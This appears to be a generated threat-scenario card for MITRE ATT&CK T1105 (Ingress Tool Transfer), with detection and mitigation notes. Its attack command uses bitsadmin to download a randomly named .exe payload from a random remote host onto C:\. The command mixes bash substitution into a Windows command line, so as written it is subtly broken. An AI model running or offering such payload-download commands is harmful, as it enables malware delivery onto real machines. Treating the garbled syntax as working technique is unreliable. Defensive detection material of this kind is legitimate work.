---
type: campaign
scenario_id: 160
tactic: Command and Control
technique: "T1105: Ingress Tool Transfer"
technique_id: T1105
tags: [campaign, lotl, command_and_control]
---

# Using bitsadmin to download malicious payload from remote server.

## Threat Description
Using bitsadmin to download malicious payload from remote server.

## Attack Command
```
bitsadmin /transfer $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /download /priority high http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) C:\$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)
```

## Detection Logic
Monitor bitsadmin: `wmic process where name='bitsadmin.exe' get commandline | findstr download`; Event ID 4688.

## Mitigation
Restrict bitsadmin: `icacls %windir%\System32\bitsadmin.exe /deny Everyone:RX`; Disable BITS: `sc config bits start= disabled`.

## AI Training Prompt
Train AI to detect bitsadmin downloads and suggest BITS restrictions.

## References
- MITRE ATT&CK T1105: https://attack.mitre.org/techniques/T1105/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
